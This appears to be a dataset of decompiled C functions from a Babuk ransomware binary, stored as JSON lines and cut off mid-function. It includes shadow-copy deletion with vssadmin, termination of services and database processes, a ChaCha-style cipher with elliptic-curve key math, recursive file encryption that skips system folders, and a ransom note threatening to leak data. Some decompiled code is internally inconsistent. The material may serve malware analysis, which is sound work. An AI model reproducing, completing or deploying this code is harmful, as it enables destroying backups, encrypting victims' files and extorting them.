{"Function Name": "FUN_004025a0", "Address": "004025a0", "Source Code": "HGLOBAL __cdecl FUN_004025a0(LPCSTR inputString, int *stringCount)\n{\n    int inputLength; \n    HGLOBAL *outputMemory; \n    HGLOBAL endPointer; \n    uint elementCount; \n    int stringIndex = 0; \n    int outputIndex = 0; \n    inputLength = lstrlenA(inputString); \n    elementCount = inputLength + 2U >> 1; \n    outputMemory = (HGLOBAL *)GlobalAlloc(0, elementCount * 4 + 6 + inputLength); \n    endPointer = outputMemory + elementCount + 1; \n    \n    *outputMemory = endPointer; \n    bool insideQuotes = false; \n    bool lastWasWhitespace = false; \n    bool lastNotWhitespace = true; \n    \n    for (int charIndex = 0; inputString[charIndex] != '\\0'; charIndex++) {\n        char currentChar = inputString[charIndex]; \n        if (insideQuotes) { \n            if (currentChar == '\\\"') { \n                insideQuotes = false; \n            } else {\n                *(char *)((int)endPointer + outputIndex) = currentChar; \n                outputIndex++; \n            }\n        } else { \n            switch (currentChar) {\n                case '\\t': \n                case '\\n': \n                case '\\r': \n                case ' ': \n                    if (lastWasWhitespace) { \n                        *(undefined *)((int)endPointer + outputIndex) = 0; \n                        outputIndex++; \n                    }\n                    lastWasWhitespace = false; \n                    lastNotWhitespace = true; \n                    break;\n                default: \n                    lastWasWhitespace = true; \n                    if (lastNotWhitespace) { \n                        outputMemory[stringIndex] = (HGLOBAL)((int)endPointer + outputIndex); \n                        stringIndex++; \n                    }\n                    *(char *)((int)endPointer + outputIndex) = currentChar; \n                    outputIndex++; \n                    lastNotWhitespace = false; \n                    break;\n                case '\\\"': \n                    insideQuotes = true; \n                    lastWasWhitespace = true; \n                    if (lastNotWhitespace) { \n                        outputMemory[stringIndex] = (HGLOBAL)((int)endPointer + outputIndex); \n                        stringIndex++; \n                    }\n                    lastNotWhitespace = false; \n            }\n        }\n    }\n    *(undefined *)((int)endPointer + outputIndex) = 0; \n    outputMemory[stringIndex] = (HGLOBAL)0x0; \n    *stringCount = stringIndex; \n    return outputMemory; \n}"}
{"Function Name": "FUN_00402770", "Address": "00402770", "Source Code": "void FUN_00402770(void)\n{\n    UINT driveType; \n    BOOL volumePathResult; \n    int volumePathLength;  \n    LPCWSTR drivePaths[26]; \n    DWORD bufferSize = 0x78; \n    LPWSTR volumeName; \n    int validDriveCount = 0; \n    uint securityCookie = DAT_004081b0 ^ (uint)&stack0xfffffffc; \n    \n    drivePaths[0] = L\"Q:\\\\\"; \n    drivePaths[1] = (LPCWSTR)&DAT_00401598; \n    drivePaths[2] = (LPCWSTR)&DAT_004015a0; \n    drivePaths[3] = (LPCWSTR)&DAT_004015a8; \n    \n    for (int driveLetterIndex = 0; driveLetterIndex < 0x1a; driveLetterIndex++) {\n        driveType = GetDriveTypeW(drivePaths[driveLetterIndex]); \n        if (driveType == 1) { \n            drivePaths[validDriveCount++] = drivePaths[driveLetterIndex]; \n        }\n    }\n    \n    volumeName = (LPWSTR)FUN_00404fc0(0x10000);\n    if (volumeName != (LPWSTR)0x0) { \n        LPVOID volumeHandleMemory = FUN_00404fc0(0x10000); \n        if (volumeHandleMemory != (LPVOID)0x0) { \n            HANDLE volumeHandle = FindFirstVolumeW(volumeName, 0x8000); \n            do {\n                if (validDriveCount == 0) break; \n                volumePathResult = GetVolumePathNamesForVolumeNameW(volumeName, volumePathNames, bufferSize, &volumePathNamesLength); \n                if ((volumePathResult == 0) || (volumePathLength = lstrlenW(volumePathNames), volumePathLength != 3)) { \n                    validDriveCount--; \n                    SetVolumeMountPointW(drivePaths[validDriveCount], volumeName); \n                }\n            } while (FindNextVolumeW(volumeHandle, volumeName, 0x8000) != 0); \n            FindVolumeClose(volumeHandle); \n            FUN_00404f90(volumeHandleMemory); \n        }\n        FUN_00404f90(volumeName); \n    }\n    ___security_check_cookie_4(securityCookie ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "FUN_00402a30", "Address": "00402a30", "Source Code": "void FUN_00402a30(void)\n{\n    HMODULE libraryHandle; \n    FARPROC functionPointer; \n    undefined4 wow64State = 0; \n    uint stackCookie = DAT_004081b0 ^ (uint)&stack0xfffffffc; \n    \n    if (FUN_00402e40() != 0) {\n        libraryHandle = LoadLibraryA(\"kernel32.dll\"); \n        functionPointer = GetProcAddress(libraryHandle, \"Wow64DisableWow64FsRedirection\"); \n        \n        if (functionPointer != (FARPROC)0x0) {\n            (*functionPointer)(&wow64State); \n        }\n    }\n    \n    ShellExecuteW((HWND)0x0, L\"open\", L\"cmd.exe\", L\"/c vssadmin.exe delete shadows /all /quiet\", (LPCWSTR)0x0, 0);\n    \n    if (FUN_00402e40() != 0) {\n        libraryHandle = LoadLibraryA(\"kernel32.dll\"); \n        functionPointer = GetProcAddress(libraryHandle, \"Wow64RevertWow64FsRedirection\"); \n        \n        if (functionPointer != (FARPROC)0x0) {\n            (*functionPointer)(wow64State); \n        }\n    }\n    \n    ___security_check_cookie_4(stackCookie ^ (uint)&stack0xfffffffc);\n    return; \n}"}
{"Function Name": "FUN_00402ae0", "Address": "00402ae0", "Source Code": "void FUN_00402ae0(void)\n{\n    BOOL serviceStatusResult; \n    DWORD errorCode; \n    int serviceIndex; \n    LPENUM_SERVICE_STATUSA serviceStatusPointer; \n    LPCSTR serviceNames[9]; \n    uint timeoutDuration; \n    DWORD initialTickCount; \n    SC_HANDLE serviceControlManagerHandle; \n    SC_HANDLE serviceHandle; \n    DWORD serviceStatusSize; \n    _SERVICE_STATUS serviceStatusInfo; \n    DWORD dependentServicesSize; \n    uint securityCookie; \n    securityCookie = DAT_004081b0 ^ (uint)&stack0xfffffffc; \n    initialTickCount = GetTickCount(); \n    timeoutDuration = 30000; \n    serviceControlManagerHandle = OpenSCManagerA((LPCSTR)0x0, (LPCSTR)0x0, 0xf003f); \n    if (serviceControlManagerHandle != (SC_HANDLE)0x0) { \n        for (uint serviceLoopIndex = 0; serviceLoopIndex < 0x2c; serviceLoopIndex++) { \n            serviceHandle = OpenServiceA(serviceControlManagerHandle, (&PTR_DAT_00408000)[serviceLoopIndex], 0x2c); \n            if (serviceHandle != (SC_HANDLE)0x0) { \n                serviceStatusResult = QueryServiceStatusEx(serviceHandle, SC_STATUS_PROCESS_INFO, (LPBYTE)&serviceStatusInfo, 0x24, &serviceStatusSize); \n                if (serviceStatusResult && serviceStatusInfo.dwCurrentState != 1 && serviceStatusInfo.dwCurrentState != 3) { \n                    LPENUM_SERVICE_STATUSA dependentServicesPointer = (LPENUM_SERVICE_STATUSA)0x0; \n                    serviceStatusResult = EnumDependentServicesA(serviceHandle, 1, dependentServicesPointer, 0, &serviceStatusSize, &dependentServicesSize); \n                    if (serviceStatusResult == 0 && (errorCode = GetLastError(), errorCode == 0xea) && (dependentServicesPointer = (LPENUM_SERVICE_STATUSA)FUN_00404fc0(serviceStatusSize), dependentServicesPointer != (LPENUM_SERVICE_STATUSA)0x0)) { \n                        serviceStatusResult = EnumDependentServicesA(serviceHandle, 1, dependentServicesPointer, serviceStatusSize, &serviceStatusSize, &dependentServicesSize); \n                        if (serviceStatusResult != 0) { \n                            serviceStatusPointer = dependentServicesPointer + serviceLoopIndex; \n                            for (serviceIndex = 9; serviceIndex != 0; serviceIndex--) { \n                                serviceNames[9 - serviceIndex] = serviceStatusPointer->lpServiceName; \n                                serviceStatusPointer = (LPENUM_SERVICE_STATUSA)&serviceStatusPointer->lpDisplayName; \n                            }\n                            SC_HANDLE firstDependentServiceHandle = OpenServiceA(serviceControlManagerHandle, serviceNames[0], 0x24); \n                            if (firstDependentServiceHandle != (SC_HANDLE)0x0 && (serviceStatusResult = ControlService(firstDependentServiceHandle, 1, &serviceStatusInfo), serviceStatusResult != 0)) { \n                                while (serviceStatusInfo.dwCurrentState != 1) { \n                                    Sleep(serviceStatusInfo.dwWaitHint); \n                                    serviceStatusResult = QueryServiceStatusEx(firstDependentServiceHandle, SC_STATUS_PROCESS_INFO, (LPBYTE)&serviceStatusInfo, 0x24, &serviceStatusSize); \n                                    if (serviceStatusResult && (serviceStatusInfo.dwCurrentState == 1 || (errorCode = GetTickCount(), timeoutDuration < errorCode - initialTickCount))) break; \n                                }\n                                CloseServiceHandle(firstDependentServiceHandle); \n                            }\n                        }\n                        FUN_00404f90(dependentServicesPointer); \n                    }\n                    serviceStatusResult = ControlService(serviceHandle, 1, &serviceStatusInfo); \n                    if (serviceStatusResult != 0) { \n                        while (serviceStatusInfo.dwCurrentState != 1) { \n                            Sleep(serviceStatusInfo.dwWaitHint); \n                            serviceStatusResult = QueryServiceStatusEx(serviceHandle, SC_STATUS_PROCESS_INFO, (LPBYTE)&serviceStatusInfo, 0x24, &serviceStatusSize); \n                            if (serviceStatusResult == 0 || serviceStatusInfo.dwCurrentState == 1 || (errorCode = GetTickCount(), timeoutDuration < errorCode - initialTickCount)) break; \n                        }\n                    }\n                }\n                CloseServiceHandle(serviceHandle); \n            }\n        }\n        CloseServiceHandle(serviceControlManagerHandle); \n    }\n    ___security_check_cookie_4(securityCookie ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "FUN_00402d30", "Address": "00402d30", "Source Code": "void FUN_00402d30(void)\n{\n    HANDLE snapshotHandle; \n    HANDLE processHandle; \n    int firstProcessResult; \n    uint processNameIndex; \n    DWORD processID; \n    WCHAR processNameBuffer[260]; \n    uint securityCookie; \n    \n    securityCookie = DAT_004081b0 ^ (uint)&stack0xfffffffc;\n    \n    \n    snapshotHandle = CreateToolhelp32Snapshot(0xf, 0);\n    \n    \n    firstProcessResult = Process32FirstW(snapshotHandle, &processID);\n    do {\n        \n        if (firstProcessResult == 0) {\n            CloseHandle(snapshotHandle); \n            ___security_check_cookie_4(securityCookie ^ (uint)&stack0xfffffffc); \n            return; \n        }\n        \n        \n        for (processNameIndex = 0; processNameIndex < 0x1f; processNameIndex++) {\n            \n            if (lstrcmpW((LPCWSTR)(&PTR_u_sql_exe_004080b0)[processNameIndex], processNameBuffer) == 0) {\n                \n                processHandle = OpenProcess(1, 0, processID);\n                \n                \n                if (processHandle != (HANDLE)0x0) {\n                    TerminateProcess(processHandle, 9); \n                    CloseHandle(processHandle); \n                }\n                break; \n            }\n        }\n        \n        \n        firstProcessResult = Process32NextW(snapshotHandle, &processID);\n    } while (true); \n}"}
{"Function Name": "FUN_00402e40", "Address": "00402e40", "Source Code": "void FUN_00402e40(void)\n{\n    HMODULE moduleHandle; \n    FARPROC functionPointer; \n    HANDLE currentProcessHandle;  \n    undefined4 isWow64Result = 0; \n    uint securityCheckValue = DAT_004081b0 ^ (uint)&stack0xfffffffc; \n    \n    functionPointer = GetProcAddress(GetModuleHandleA(\"kernel32.dll\"), \"IsWow64Process\");\n    \n    \n    if (functionPointer != (FARPROC)0x0) {\n        currentProcessHandle = GetCurrentProcess(); \n        (*functionPointer)(currentProcessHandle, &isWow64Result); \n    }\n    \n    \n    ___security_check_cookie_4(securityCheckValue ^ (uint)&stack0xfffffffc);\n    return; \n}"}
{"Function Name": "FUN_00402eb0", "Address": "00402eb0", "Source Code": "void __cdecl\nFUN_00402eb0(int param_1, undefined4 param_2, int param_3, int param_4, int param_5, int param_6)\n{\n    int local_90; \n    undefined4 local_88[12]; \n    byte local_48[64]; \n    uint local_8 = DAT_004081b0 ^ (uint)&stack0xfffffffc; \n    \n    FUN_00403350(local_88, param_1, param_2, param_3);\n    \n    \n    for (local_90 = 0; local_90 < param_6; local_90 += 0x40) {\n        \n        FUN_00403210((char *)local_88, (int)local_48, 0x14);\n        \n        \n        for (int local_8c = local_90; local_8c < local_90 + 0x40 && local_8c < param_6; local_8c++) {\n            *(byte *)(param_5 + local_8c) = *(byte *)(param_4 + local_8c) ^ local_48[local_8c - local_90];\n        }\n    }\n    \n    \n    ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);\n    return; \n}"}
{"Function Name": "FUN_00402fc0", "Address": "00402fc0", "Source Code": "void __cdecl FUN_00402fc0(undefined4 input_value, undefined *output_array)\n{\n    \n    output_array[0] = (char)input_value;\n    \n    \n    output_array[1] = (char)((uint)input_value >> 8);\n    \n    \n    output_array[2] = (char)((uint)input_value >> 0x10);\n    \n    \n    output_array[3] = (char)((uint)input_value >> 0x18);\n}"}
{"Function Name": "FUN_00403030", "Address": "00403030", "Source Code": "undefined4 __cdecl FUN_00403030(undefined4 *input_pointer)\n{\n    \n    return *input_pointer; \n}"}
{"Function Name": "FUN_00403210", "Address": "00403210", "Source Code": "void __cdecl FUN_00403210(char *input_buffer, int output_param, int loop_count)\n{\n    int counter; \n    int data_array[16]; \n    uint security_cookie = DAT_004081b0 ^ (uint)&stack0xfffffffc; \n    und_memcpy((char *)data_array, input_buffer, 0x40); \n    for (counter = loop_count; counter > 0; counter -= 2) { \n        \n        FUN_004030c0((int)data_array, 0, 4, 8, 0xc);\n        FUN_004030c0((int)data_array, 1, 5, 9, 0xd);\n        FUN_004030c0((int)data_array, 2, 6, 10, 0xe);\n        FUN_004030c0((int)data_array, 3, 7, 0xb, 0xf);\n        FUN_004030c0((int)data_array, 0, 5, 10, 0xf);\n        FUN_004030c0((int)data_array, 1, 6, 0xb, 0xc);\n        FUN_004030c0((int)data_array, 2, 7, 8, 0xd);\n        FUN_004030c0((int)data_array, 3, 4, 9, 0xe);\n    }\n    for (counter = 0; counter < 0x10; counter++) { \n        data_array[counter] += *(int *)(input_buffer + counter * 4); \n    }\n    FUN_004031d0((int)data_array, output_param); \n    ___security_check_cookie_4(security_cookie ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "FUN_00403350", "Address": "00403350", "Source Code": "void __cdecl FUN_00403350(undefined4 *outputArray, int inputOffset1, undefined4 inputValue1, int inputOffset2)\n{\n    \n    *outputArray = 0x61707865; \n    outputArray[1] = 0x3320646e; \n    outputArray[2] = 0x79622d32; \n    outputArray[3] = 0x6b206574; \n    \n    for (int index = 0; index < 8; index++) {\n        outputArray[index + 4] = FUN_00403030((undefined4 *)(inputOffset1 + index * 4)); \n    }\n    \n    outputArray[0xc] = inputValue1;\n    \n    for (index = 0; index < 3; index++) {\n        outputArray[index + 0xd] = FUN_00403030((undefined4 *)(inputOffset2 + index * 4)); \n    }\n}"}
{"Function Name": "FUN_00403420", "Address": "00403420", "Source Code": "void __cdecl FUN_00403420(int destination_address, uint num_elements)\n{\n    \n    EnterCriticalSection((LPCRITICAL_SECTION)&critical_section);\n    \n    \n    FUN_00402eb0(0x4081d8, 0x14, 0x4081f8, 0x408204, 0x408204, 0x2c);\n    \n    \n    FUN_00402eb0(0x408204, 0x14, 0x408224, 0x4081d8, 0x4081d8, 0x2c);\n    \n    \n    for (uint index = 0; index < num_elements; index++) {\n        \n        *(undefined *)(destination_address + index) = (&source_array)[index];\n    }\n    \n    \n    LeaveCriticalSection((LPCRITICAL_SECTION)&critical_section);\n}"}
{"Function Name": "FUN_004034b0", "Address": "004034b0", "Source Code": "void initializeCriticalSection(void)\n{\n    \n    InitializeCriticalSection((LPCRITICAL_SECTION)&criticalSection);\n    \n    \n    FARPROC systemFunctionAddress = getProcAddress(loadLibrary(\"advapi32.dll\"), \"SystemFunction036\");\n    \n    \n    (*systemFunctionAddress)(&parameters, 0x58);\n}"}
{"Function Name": "FUN_004034f0", "Address": "004034f0", "Source Code": "undefined4 __cdecl FUN_004034f0(int input_param, uint *uint_pointer)\n{\n    int result_value; \n    undefined4 unused_return_value; \n    \n    FUN_00403c20(input_param, input_param + 0x48, 0x401808, 0x401850);\n    \n    result_value = FUN_004037b0(uint_pointer);\n    \n    if (result_value < 0x11d) {\n        return 0; \n    }\n    \n    result_value = FUN_004037b0((uint *)&DAT_00401898);\n    \n    for (uint loop_index = result_value - 1; (int)loop_index < 0x240; loop_index++) {\n        \n        FUN_00403620((int)uint_pointer, loop_index);\n    }\n    \n    FUN_00403f70(input_param, input_param + 0x48, uint_pointer);\n    return 1; \n}"}
{"Function Name": "FUN_00403590", "Address": "00403590", "Source Code": "undefined4 __cdecl FUN_00403590(uint *data_pointer, int source_address, int destination_address)\n{\n    \n    \n    if (FUN_00403c70(source_address, source_address + 0x48) == 0 && FUN_00404050(source_address, source_address + 0x48) != 0) {\n        \n        for (uint byte_index = 0; byte_index < 0x90; byte_index++) {\n            \n            *(undefined *)(destination_address + byte_index) = *(undefined *)(source_address + byte_index);\n        }\n        \n        FUN_00403f70(destination_address, destination_address + 0x48, data_pointer);\n        \n        return 1;\n    }\n    \n    return 0;\n}"}
{"Function Name": "FUN_00403620", "Address": "00403620", "Source Code": "void __cdecl FUN_00403620(int base_address, uint index)\n{\n    \n    \n    \n    *(uint *)(base_address + (index >> 5) * 4) \n        \n        \n        &= ~(1 << ((byte)index & 0x1f));\n}"}
{"Function Name": "FUN_00403650", "Address": "00403650", "Source Code": "void __cdecl FUN_00403650(int destination, int source)\n{\n    \n    for (int index = 0; index < 0x12; index++) {\n        \n        \n        *(undefined4 *)(destination + index * 4) = *(undefined4 *)(source + index * 4);\n    }\n}"}
{"Function Name": "FUN_00403690", "Address": "00403690", "Source Code": "void __cdecl FUN_00403690(int input_value_1, int input_value_2)\n{\n    undefined buffer[72]; \n    uint security_cookie = DAT_004081b0 ^ (uint)&stack0xfffffffc; \n    FUN_00403650((int)buffer, input_value_1); \n    FUN_00403650(input_value_1, input_value_2); \n    FUN_00403650(input_value_2, (int)buffer); \n    ___security_check_cookie_4(security_cookie); \n}"}
{"Function Name": "FUN_004036e0", "Address": "004036e0", "Source Code": "undefined4 __cdecl FUN_004036e0(int array1, int array2)\n{\n    int index = 0; \n    while (index <= 0x11) { \n        \n        if (*(int *)(array1 + index * 4) != *(int *)(array2 + index * 4)) \n            return 0; \n        index++; \n    }\n    return 1; \n}"}
{"Function Name": "FUN_00403760", "Address": "00403760", "Source Code": "bool __cdecl FUN_00403760(int input_pointer)\n{\n    \n    for (uint index = 0; index < 0x12 && (*(int *)(input_pointer + index * 4) == 0); index++) {\n        \n        \n    }\n    \n    return index == 0x12;\n}"}
{"Function Name": "FUN_004037b0", "Address": "004037b0", "Source Code": "int __cdecl FUN_004037b0(uint *input_pointer)\n{\n    uint bit_mask; \n    int counter = 0x240; \n    input_pointer += 0x12; \n    \n    \n    while (counter > 0 && *--input_pointer == 0) {\n        counter -= 0x20; \n    }\n    \n    \n    if (counter != 0) {\n        \n        for (bit_mask = 0x80000000; (*input_pointer & bit_mask) == 0; bit_mask >>= 1) {\n            counter--; \n        }\n    }\n    \n    return counter; \n}"}
{"Function Name": "FUN_00403820", "Address": "00403820", "Source Code": "void __cdecl FUN_00403820(int *array, int source, uint size)\n{\n    int index; \n    \n    for (index = 0; index < (int)(size + ((int)size >> 0x1f & 0x1fU)) >> 5; index++) {\n        array[index] = 0; \n    }\n    \n    for (int copy_index = 0; index < 0x12; index++, copy_index++) {\n        array[index] = *(int *)(source + copy_index * 4); \n    }\n    \n    if ((size & 0x1f) != 0) {\n        \n        for (int shift_index = 0x11; shift_index > 0; shift_index--) {\n            array[shift_index] = array[shift_index] << (sbyte)(size & 0x1f) | (uint)array[shift_index - 1] >> (0x20U - (size & 0x1f) & 0x1f); \n        }\n        *array = *array << (sbyte)(size & 0x1f); \n    }\n    return; \n}"}
{"Function Name": "FUN_00403910", "Address": "00403910", "Source Code": "void __cdecl FUN_00403910(undefined4 *array)\n{\n    \n    *array = 1;\n    \n    for (int index = 1; index < 0x12; index++) {\n        \n        array[index] = 0;\n    }\n}"}
{"Function Name": "FUN_00403960", "Address": "00403960", "Source Code": "bool __cdecl FUN_00403960(int *array_pointer)\n{\n    \n    if (*array_pointer == 1) {\n        \n        for (int index = 1; index < 0x12 && array_pointer[index] == 0; index++) {\n            \n        }\n        \n        return index == 0x12;\n    }\n    \n    return false;\n}"}
{"Function Name": "FUN_004039c0", "Address": "004039c0", "Source Code": "void __cdecl FUN_004039c0(int output_pointer, int input_array_1, int input_array_2)\n{\n    \n    for (int index = 0; index < 0x12; index++) {\n        \n        \n        *(uint *)(output_pointer + index * 4) = *(uint *)(input_array_1 + index * 4) ^ *(uint *)(input_array_2 + index * 4);\n    }\n}"}
{"Function Name": "FUN_00403a00", "Address": "00403a00", "Source Code": "void __cdecl FUN_00403a00(int input_param_1, int input_param_2, int input_param_3)\n{\n    uint result_value; \n    int data_array[18]; \n    uint loop_counter; \n    uint stack_cookie = DAT_004081b0 ^ (uint)&stack0xfffffffc; \n    FUN_00403650((int)data_array, input_param_2); \n    result_value = FUN_00404130(input_param_3, 0); \n    \n    if (result_value == 0) { \n        __FillZeroMan(input_param_1); \n    } else {\n        FUN_00403650(input_param_1, input_param_2); \n    }\n    for (loop_counter = 1; (int)loop_counter < 0x23b; loop_counter++) { \n        FUN_00403820(data_array, (int)data_array, 1); \n        result_value = FUN_00404130((int)data_array, 0x23b); \n        \n        if (result_value != 0) { \n            FUN_004039c0((int)data_array, (int)data_array, 0x401778); \n        }\n        \n        result_value = FUN_00404130(input_param_3, loop_counter); \n        \n        if (result_value != 0) { \n            FUN_004039c0(input_param_1, input_param_1, (int)data_array); \n        }\n    }\n    \n    ___security_check_cookie_4(stack_cookie ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "FUN_00403ae0", "Address": "00403ae0", "Source Code": "void __cdecl FUN_00403ae0(undefined4 *input_param,int input_param_2)\n{\n    uint difference_value; \n    undefined temp_buffer[72]; \n    int computed_values[18]; \n    uint results_array[18]; \n    uint stack_cookie = DAT_004081b0 ^ (uint)&stack0xfffffffc; \n    FUN_00403650((int)results_array, input_param_2); \n    FUN_00403650((int)constant_value, 0x401778); \n    __FillZeroMan((int)temp_buffer); \n    FUN_00403910(input_param); \n    while (true) { \n        if (FUN_00403960((int *)results_array)) break; \n        int value_from_results = FUN_004037b0(results_array); \n        int value_from_constant = FUN_004037b0(constant_value); \n        difference_value = value_from_results - value_from_constant; \n        if ((int)difference_value < 0) { \n            FUN_00403690((int)results_array, (int)constant_value); \n            FUN_00403690((int)temp_buffer, (int)input_param); \n            difference_value = -difference_value; \n        }\n        FUN_00403820(computed_values, (int)constant_value, difference_value); \n        FUN_004039c0((int)results_array, (int)results_array, (int)computed_values); \n        FUN_00403820(computed_values, (int)temp_buffer, difference_value); \n        FUN_004039c0((int)input_param, (int)input_param, (int)computed_values); \n    }\n    ___security_check_cookie_4(stack_cookie ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "FUN_00403c50", "Address": "00403c50", "Source Code": "void __cdecl FUN_00403c50(int input1, int input2)\n{\n    \n    __FillZeroMan(input1);\n    \n    \n    __FillZeroMan(input2);\n}"}
{"Function Name": "FUN_00403cb0", "Address": "00403cb0", "Source Code": "void __cdecl FUN_00403cb0(int inputValue1,int inputValue2)\n{\n    bool isFunctionSuccessful; \n    undefined4 dataBuffer[18]; \n    uint securityCookie; \n    \n    securityCookie = DAT_004081b0 ^ (uint)&stack0xfffffffc;\n    \n    isFunctionSuccessful = FUN_00403760(inputValue1);\n    \n    if (!isFunctionSuccessful) {\n        \n        FUN_00403ae0(dataBuffer,inputValue1);\n        \n        FUN_00403a00((int)dataBuffer,(int)dataBuffer,inputValue2);\n        \n        FUN_004039c0((int)dataBuffer,(int)dataBuffer,inputValue1);\n        \n        FUN_00403a00(inputValue2,inputValue1,inputValue1);\n        \n        FUN_00403a00(inputValue1,(int)dataBuffer,(int)dataBuffer);\n        FUN_004039c0(inputValue1,inputValue1,(int)dataBuffer);\n        \n        FUN_00403a00((int)dataBuffer,(int)dataBuffer,inputValue1);\n        \n        FUN_004039c0(inputValue2,inputValue2,(int)dataBuffer);\n    }\n    else {\n        \n        __FillZeroMan(inputValue2);\n    }\n    \n    ___security_check_cookie_4(securityCookie ^ (uint)&stack0xfffffffc);\n    \n    return; \n}"}
{"Function Name": "FUN_00403d90", "Address": "00403d90", "Source Code": "void __cdecl FUN_00403d90(int input_a,int input_b,int input_c,int input_d)\n{\n    int return_value; \n    undefined temp_buffer_a[72]; \n    undefined4 temp_buffer_b[18]; \n    undefined temp_buffer_c[72]; \n    uint security_cookie; \n    security_cookie = DAT_004081b0 ^ (uint)&stack0xfffffffc; \n    return_value = FUN_00403c70(input_c,input_d); \n    if (return_value == 0) { \n        return_value = FUN_00403c70(input_a,input_b); \n        if (return_value == 0) { \n            return_value = FUN_004036e0(input_a,input_c); \n            if (return_value == 0) { \n                FUN_004039c0((int)temp_buffer_a,input_b,input_d); \n                FUN_004039c0(input_a,input_c,(int)temp_buffer_b); \n                FUN_00403a00((int)temp_buffer_b,(int)temp_buffer_b,(int)temp_buffer_a); \n                FUN_00403a00((int)temp_buffer_c,(int)temp_buffer_b,(int)temp_buffer_b); \n                FUN_004039c0((int)temp_buffer_c,(int)temp_buffer_c,(int)temp_buffer_b); \n                FUN_004039c0((int)temp_buffer_c,(int)temp_buffer_c,(int)temp_buffer_b); \n                FUN_004039c0(input_a,input_a,(int)temp_buffer_c); \n                FUN_00403a00((int)temp_buffer_a,input_a,(int)temp_buffer_b); \n                FUN_004039c0(input_b,input_b,(int)temp_buffer_a); \n                FUN_00403650(input_a,(int)temp_buffer_c); \n            }\n            else { \n                return_value = FUN_004036e0(input_b,input_d); \n                if (return_value == 0) { \n                    FUN_00403c50(input_a,input_b); \n                } else {\n                    FUN_00403cb0(input_a,input_b); \n                }\n            }\n        }\n    } else { \n        FUN_00403c20(input_a,input_b,input_c,input_d); \n    }\n    ___security_check_cookie_4(security_cookie ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "FUN_00404050", "Address": "00404050", "Source Code": "void __cdecl FUN_00404050(int input_param_1, int input_param_2)\n{\n    uint security_cookie; \n    security_cookie = DAT_004081b0 ^ (uint)&stack0xfffffffc; \n    \n    if (FUN_00403c70(input_param_1, input_param_2) == 0) {\n        \n        FUN_00403a00((int)data_buffer_1, input_param_1, input_param_1);\n        \n        \n        FUN_00403a00((int)data_buffer_1, (int)data_buffer_1, input_param_1);\n        \n        \n        FUN_004039c0((int)data_buffer_1, (int)data_buffer_1, 0x4017c0);\n        \n        \n        FUN_00403a00((int)data_buffer_2, input_param_2, input_param_2);\n        \n        \n        FUN_004039c0((int)data_buffer_1, (int)data_buffer_1, (int)data_buffer_2);\n        \n        \n        FUN_00403a00((int)data_buffer_2, input_param_1, input_param_2);\n        \n        \n        FUN_004036e0((int)data_buffer_1, (int)data_buffer_2);\n    }\n    \n    ___security_check_cookie_4(security_cookie ^ (uint)&stack0xfffffffc);\n    return; \n}"}
{"Function Name": "FUN_00404130", "Address": "00404130", "Source Code": "uint __cdecl FUN_00404130(int array_base, uint bit_position)\n{\n    \n    \n    \n    \n    uint retrieved_value = *(uint *)(array_base + (bit_position >> 5) * 4);\n    \n    \n    \n    \n    uint isolated_bit = retrieved_value >> (bit_position & 0x1f);\n    \n    \n    \n    return isolated_bit & 1;\n}"}
{"Function Name": "FUN_00404620", "Address": "00404620", "Source Code": "void __cdecl FUN_00404620(LPCWSTR inputPath, uint recursionDepth)\n{\n    LPWSTR filePath; \n    HANDLE fileHandle; \n    BOOL isFileFound; \n    _WIN32_FIND_DATAW fileData; \n    uint stackProtection; \n    stackProtection = DAT_004081b0 ^ (uint)&stack0xfffffffc; \n    filePath = (LPWSTR)FUN_00404fc0(0x10000); \n    if (filePath != (LPWSTR)0x0) { \n        lstrcpyW(filePath, inputPath); \n        lstrcatW(filePath, L\"\\\\*\"); \n        fileHandle = FindFirstFileW(filePath, &fileData); \n        if (fileHandle != (HANDLE)0xffffffff) { \n            do {\n                for (uint index = 0; index < 0x1f; index++) { \n                    if (lstrcmpiW(fileData.cFileName, (LPCWSTR)(&PTR_u_Windows_00408130)[index]) == 0) \n                        goto LAB_004047db; \n                }\n                lstrcpyW(filePath, inputPath); \n                lstrcatW(filePath, L\"\\\\\"); \n                lstrcatW(filePath, fileData.cFileName); \n                if ((fileData.dwFileAttributes & 0x10) == 0) { \n                    if (lstrcmpW(fileData.cFileName, L\"How To Restore Your Files.txt\") != 0) { \n                        for (int charIndex = lstrlenW(fileData.cFileName) - 1; charIndex >= 0; charIndex--) { \n                            if (fileData.cFileName[charIndex] == L'.') { \n                                if (lstrcmpW(fileData.cFileName + charIndex, L\".__NIST_K571__\") == 0) \n                                    goto LAB_004047db; \n                                break; \n                            }\n                        }\n                        FUN_00404150(filePath); \n                    }\n                } else if (recursionDepth < 0x10) { \n                    FUN_00404620(filePath, recursionDepth + 1); \n                }\nLAB_004047db:\n                isFileFound = FindNextFileW(fileHandle, &fileData); \n            } while (isFileFound != 0); \n            FindClose(fileHandle); \n            lstrcpyW(filePath, inputPath); \n            lstrcatW(filePath, L\"\\\\How To Restore Your Files.txt\"); \n            fileHandle = CreateFileW(filePath, 0x40000000, 1, (LPSECURITY_ATTRIBUTES)0x0, 1, 0, (HANDLE)0x0); \n            if (fileHandle != (HANDLE)0xffffffff) { \n                WriteFile(fileHandle,\n                \"----------- [ Hello! ] ------------->\\r\\n\\r\\n       ****BY BABUK LOCKER****\\r\\n\\r\\nWhat happend?\\r\\n----------------------------------------------\\r\\nYour computers and servers are encrypted, backups are deleted from your network and copied. We use strong encryption algorithms, so you cannot decrypt your data.\\r\\nBut you can restore everything by purchasing a special program from us - a universal decoder. This program will restore your entire network.\\r\\nFollow our instructions below and you will recover all your data.\\r\\nIf you continue to ignore this for a long time, we will start reporting the hack to mainstream media and posting your data to the dark web.\\r\\n\\r\\nWhat guarantees?\\r\\n----------------------------------------------\\r\\nWe value our reputation. If we do not do our work and liabilities, nobody will pay us. This is not in our interests.\\r\\nAll our decryption software is perfectly tested and will decrypt your data. We will also provide support in case of problems.\\r\\nWe guarantee to decrypt one file for free. Go to the site and contact us.\\r\\n\\r\\nHow to contact us? \\r\\n----------------------------------------------\\r\\nUsing TOR Browser ( https:\", 0x558, NULL, (LPOVERLAPPED)0x0); \n                